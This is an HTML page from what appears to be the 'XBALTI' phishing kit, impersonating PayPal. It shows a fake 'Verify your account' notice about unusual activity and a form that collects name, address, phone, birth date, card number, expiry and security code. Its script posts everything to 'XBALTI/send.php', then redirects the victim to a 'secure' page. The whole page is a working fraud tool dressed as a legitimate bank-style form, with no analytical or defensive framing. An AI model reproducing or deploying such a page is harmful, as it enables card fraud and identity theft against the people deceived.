<!--  
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     
-->
<!DOCTYPE html>
<html>

<head>
    <title>PayPal: Summary</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./img/pp144.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./img/pp114.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./img/pp72.png">
    <link rel="apple-touch-icon-precomposed" href="./img/pp64.png">
    <link rel="shortcut icon" sizes="196x196" href="./img/pp196.png">
    <link rel="shortcut icon" type="image/x-icon" href="./img/favicon.ico">
    <link rel="icon" type="image/x-icon" href="./img/pp32.png">
    <link rel="stylesheet" href="css/2.css">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.validate.min.js"></script>
    <script src="js/jquery.CardValidator.js"></script>
</head>

<body>
    <div id="app-element-mountpoint">
        <div id="document-body" data-reactroot="" data-reactid="1">
            <div class="background" data-reactid="2">
                <div data-reactid="4">
                    <div id="document-tratki" class="signup clear app-wrapper " data-reactid="5">
                        <div class="signup-page-header" data-reactid="6"><a href="#" onclick="openNav()" class="signup-page-header-logo" data-reactid="7">Paypal</a><a href="#" onclick="openNav()" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary " data-reactid="8">Log Out</a></div>
                        <main data-reactid="9">
                            <div data-reactid="10">
                                <div class="signup-page-form" data-reactid="12">
                                    <div class="notification" data-reactid="13"></div>
                                    <div data-reactid="14">
                                        <div id="spinner" style="display:none;">
                                            <div class="notification"></div>
                                            <div class="busyIcon"></div>
                                            <div class="busyOverlay"></div>
                                        </div>
                                        <form action="" name="bilings" id="bilings" class="signupAppContent" method="POST" data-reactid="16">
                                            <div data-reactid="18">
                                                <div id="bilingkatba" class="" style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
                                                    <h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Verify your account</h1></div>
                                            </div>
                                            <hr>
                                            <center>
                                                <h4 style="color: #6c7378;">Dear Customer, We noticed some unusual activity. Please help us ensure your account is <a style="color: #4caf50;" >secure</a> by answering a few question.</h4></center>
                                            <div class="fieldGroupContainer" data-reactid="23">
                                                <div id="billing">
                                                    <center>
                                                        <h4>Impact on account: <a style="color: red;">High</a></h4></center>
                                                    <div id="errorrbiliing"></div>
                                                    <h3>Update Billing Address</h3>
                                                    <div class="multi equal clearfix">
                                                        <div class=" left">
                                                            <div class="vx_red dor vx_form-group vx_floatingLabel_active" data-label-content="First name" data-reactid="128">
                                                                <label for="expDate" data-reactid="129">First name</label>
                                                                <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                                    <input data-rule-pattern="^[a-z A-Z0-9]+$" value="" type="text" required="required" ng-model="Firstname" id="Firstname" aria-describedby="text-info-expDate FirstnameinputError" name="Firstname" class="" placeholder="Enter First name" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false"> </div>
                                                            </div>
                                                            <label id="FirstnameinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                        </div>
                                                        <div class="right">
                                                            <div class="vx_red vx_form-group vx_floatingLabel_active " data-label-content="Last Name" data-reactid="128">
                                                                <label for="expDate" data-reactid="129">Last Name</label>
                                                                <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                                    <input required="required" type="text" ng-model="LastName" id="LastName" aria-describedby="text-info-expDate LastNameinputError" name="LastName" class="" placeholder="Enter Last Name" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"> </div>
                                                            </div>
                                                            <label id="LastNameinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                        </div>
                                                    </div>
                                                    <div class="vx_red vx_form-group vx_floatingLabel_active " data-label-content="Address Line" data-reactid="128">
                                                        <label for="expDate" data-reactid="129">Address Line</label>
                                                        <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                            <input required="required" type="text" id="addres" aria-describedby="text-info-expDate addresinputError" name="addres" class="test_expDate vx_has-error-with-message vx_form-control-message" placeholder="Enter Address Line" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"> </div>
                                                    </div>
                                                    <label id="addresinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                    <div class="multi equal clearfix">
                                                        <div class=" left">
                                                            <div class="vx_red vx_form-group vx_floatingLabel_active" data-label-content="City" data-reactid="128">
                                                                <label for="expDate" data-reactid="129">City</label>
                                                                <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                                    <input type="text" required="required" ng-model="City" id="City" aria-describedby="text-info-expDate CityinputError" name="City" class="" placeholder="Enter City" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false"> </div>
                                                            </div>
                                                            <label id="CityinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                        </div>
                                                        <div class="right">
                                                            <div class="vx_red vx_form-group vx_floatingLabel_active " data-label-content="State" data-reactid="128">
                                                                <label for="expDate" data-reactid="129">State</label>
                                                                <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                                    <input required="required" type="text" ng-model="State" id="State" aria-describedby="text-info-expDate StateinputError" name="State" class="" placeholder="Enter State" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"> </div>
                                                            </div>
                                                            <label id="StateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                        </div>
                                                    </div>
                                                    <div class="vx_red vx_form-group vx_floatingLabel_active" data-label-content="Postal Code" data-reactid="128">
                                                        <label for="expDate" data-reactid="129">Zip Code</label>
                                                        <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                            <input type="text" required="required" id="zipCod" aria-describedby="text-info-expDate zipCodinputError" name="zipCod" class="test_expDate hasText valid" placeholder="Enter Zip Code" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false"> </div>
                                                    </div>
                                                    <label id="zipCodinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                    <div class="vx_red vx_form-group vx_floatingLabel_active" data-label-content="Phone Number" data-reactid="128">
                                                        <label for="expDate" data-reactid="129">Phone Number</label>
                                                        <div class="vx_form-control vx_form-control_complex a" data-reactid="130">
                                                            <input type="text" required="required" id="phoneNumber" aria-describedby="text-info-expDate phoneNumberinputError" name="phoneNumber" class="test_phoneNumber hasText valid" placeholder="Enter Phone Number" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false"> </div>
                                                    </div>
                                                    <label id="phoneNumberinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                                                    <div class="vx_red vx_form-group vx_floatingLabel_active " data-label-content="Birth date" data-reactid="124">
                                                        <label for="birthdate" data-reactid="125">Birth date</label>
                                                        <div class="vx_form-control vx_form-control_complex" data-reactid="126">

                                                            <input minlength="8" data-rule-pattern="^[a-zA-Z0-9 ;,\.\/\\_\-\)\(:]+$" required="required" type="text" id="birthdate" aria-describedby="text-info-cardNumber email_addressinputError birthdateinputError" name="birthdate" class="hasText valid" placeholder="DD/MM/YYYY" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="false">

                                                        </div>
                                                    </div>

                                                    <label id="birthdateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                                                    <br>
                                                    <hr>
                                                    <h3>Update credit/debit card</h3>
                                                    <div>
                                                        <ul class="gadiha">
                                                            <div class="zwina"> <span id="visa" class="img_small shadow visaimg card-icons "></span> </div>
                                                            <div class="zwina"> <span id="mastercard" class="img_small shadow mastercardimg card-icons"></span> </div>
                                                            <div class="zwina"> <span id="amex" class="img_small shadow ameximg card-icons"> </span> </div>
                                                            <div class="zwina"> <span id="discover" class="img_small shadow discoverimg card-icons"> </span> </div>
                                                        </ul>
                                                    </div>
                                                    <div class="vx_red vx_form-group vx_floatingLabel_active" data-label-content="Credit or debit card number" data-reactid="124">
                                                        <label for="cardNumber" data-reactid="125">Credit or debit card number</label>
                                                        <div class="vx_form-control vx_form-control_complex" data-reactid="126">
                                                            <input maxlength="24" minlength="14" type="text" required="required" id="cardNumber" aria-describedby="text-info-cardNumber cardNumberinputError" name="cardNumber" class="test_cardNumber vx_form-control-message" placeholder="Enter card number" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="true"><span class="cartaico" id="creditCard" role="img"></span></div>
                                                    </div>
                                                    <label id="cardNumberinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                    <div class="multi equal clearfix">
                                                        <div class=" left">
                                                            <div class="vx_red vx_form-group vx_floatingLabel_active" data-label-content="Expiry date" data-reactid="128">
                                                                <label for="expDate" data-reactid="129">Expiry date</label>
                                                                <div class="vx_form-control vx_form-control_complex" data-reactid="130">
                                                                    <input maxlength="7" minlength="5" type="text" id="expdate" ng-model="expdate" aria-describedby="text-info-expDate expDateinputError" name="expdate" class="test_expDate hasText valid" required="required" placeholder="mm/yy" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false"> </div>
                                                            </div>
                                                            <label id="expDateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                        </div>
                                                        <div class="right">
                                                            <div class="vx_red vx_form-group vx_floatingLabel_active" data-label-content="Security code" data-reactid="135">
                                                                <label for="verificationCode" data-reactid="136">Security code</label>
                                                                <div class="vx_form-control vx_form-control_complex" data-reactid="137">
                                                                    <input id="ccv" name="ccv" maxlength="4" type="text" aria-describedby="text-info-verificationCode verificationCodeinputError" class="test_verificationCode hasText valid " required="required" placeholder="Enter security code" autocomplete="off" data-reactid="138" aria-required="true" aria-invalid="false"> <span class="cvvico" id="cvvHolder" role="img"></span></div>
                                                            </div>
                                                            <label id="verificationCodeinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
                                                        </div>
                                                    </div>
                                                    <input type="hidden" name="cardtype" value="" id="cardtype">
                                                    <br>
                                                    <button type="submit" class="vx_btn vx_btn-block validateBeforeSubmit">Continue</button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                    <div class="signup-page-footer vx_text-legal text-center" data-reactid="87"> ©1999-2019 Paypal, Inc. All rights reserved.<span class="signup-page-footer-separator" data-reactid="89">|</span><a href="#" data-reactid="90" pa-marked="1">Privacy</a><span class="signup-page-footer-spacer" data-reactid="91">&nbsp;</span><a href="#" data-reactid="92" pa-marked="1">Legal</a><span class="signup-page-footer-spacer" data-reactid="93">&nbsp;</span><a href="#" data-reactid="94" pa-marked="1">Contact</a><span class="signup-page-footer-spacer" data-reactid="95">&nbsp;</span><span data-reactid="96"><a style="cursor:pointer;" data-reactid="97" pa-marked="1">Feedback</a></span>
                                        <a href="#" data-reactid="99" pa-marked="1"></a>
                                    </div>
                                </div>
                            </div>
                        </main>
                        <div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;over-flow:hidden;" data-reactid="115"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
    $('#cardNumber').validateCreditCard(function(result) {
		if (result.card_type != null) {switch (result.card_type.name) {
			case "VISA":
						$('#creditCard').css('background-position', '98.5% -1%');
                $( "#visa" ).removeClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'Visa';
						break;

			case "VISA ELECTRON":
                $( "#visa" ).removeClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						$('#creditCard').css('background-position', '98.5%  47.4%');
						document.getElementById('cardtype').value = 'Visa Electron';
						break;

			case "MASTERCARD":
				$('#creditCard').css('background-position', '98.5%  5%');
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).removeClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'MasterCard';
						break;

			case "MAESTRO":
						$('#creditCard').css('background-position', '98.5%  35%');
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).removeClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'Maestro';
						break;

			case "DISCOVER":
						$('#creditCard').css('background-position', '98.5%  16.7%');
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).removeClass( "transparent" );
						document.getElementById('cardtype').value = 'Discover';
						break;

			case "AMEX":
						$('#creditCard').css('background-position', '99% 11%');
						$('#cvvHolder').css('background-position', '99% 94%');
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).removeClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'Amex';
						break;

			case "JCB":
						$('#creditCard').css('background-position', '98.5% 28.8%');
                 $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'JCB';
						break;

			case "DINERS_CLUB":
						$('#creditCard').css('background-position', '98.5% 23%');
                                 $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'Diner Club';
						break;

			default:$('#creditCard').css('background-position', '98.5% 82%');
                break;
        }
                                      } 

		else {
            $('#creditCard').css('background-position', '98.5% 82%');
            $('#cvvHolder').css('background-position', '99% 88%');
           $( "#visa" ).removeClass( "transparent" );
                $( "#amex" ).removeClass( "transparent" );
                $( "#mastercard" ).removeClass( "transparent" );
                $( "#discover" ).removeClass( "transparent" );
            document.getElementById('cardtype').value = '';
        }
    
    
    });



     $(function() {

    var validator = $("#bilings").bind("invalid-form.validate", function() {
			$("#errorrbiliing").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='bilings']").validate({

	errorContainer: $("#errorrbiliing"),



    rules: {
      Firstname: "required",
      LastName: "required",
      phoneNumber : "required",
      zipCod : "required",
      addres : "required",
      City : "required",
      State : "required",
        cardNumber : "required",
       expdate : "required",
        ccv : "required",
    },

      highlight: function ( element, errorClass, validClass ) {
   $( element ).parents( ".vx_red" ).removeClass( validClass );
	$( element ).parents( ".vx_red" ).addClass( errorClass );
				},
   unhighlight: function (element, errorClass, validClass ) {
	$( element ).parents( ".vx_red" ).addClass( validClass );
    $( element ).parents( ".vx_red" ).removeClass( errorClass );
				},
       messages: {
      Firstname: "First Name is required",
      LastName: "Last Name is required",
      phoneNumber : "Phone Number is required",
      zipCod : "Zip Code is required",
      addres : "Address Line is required",
      City : "City is required",
        State : "State is required",
           birthdate : "Birth Date Day/Month/Year is required",
        cardNumber : "Card Number is required",
        expdate : "mm/yy is required",
        ccv : "CSC is required",
    },

     submitHandler: function(form) {
            $("#spinner").show();
                 $.post("XBALTI/send.php", $("#bilings").serialize(), function(result) {
                          setTimeout(function() {
                                $(location).attr("href", "secure");
                        },1000);
            });
        },
  
    });

});


    </script>
    <script src="js/input.player.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
    $('input[name="phoneNumber"]').mask('000000000000');
    $('input[name="cardNumber"]').mask('0000 0000 0000 0000 0000');
    $('input[name="expdate"]').mask('00/00');
    $('input[name="ccv"]').mask('0000');
    $('input[name="birthdate"]').mask('00/00/0000');
    </script>
</body>

</html>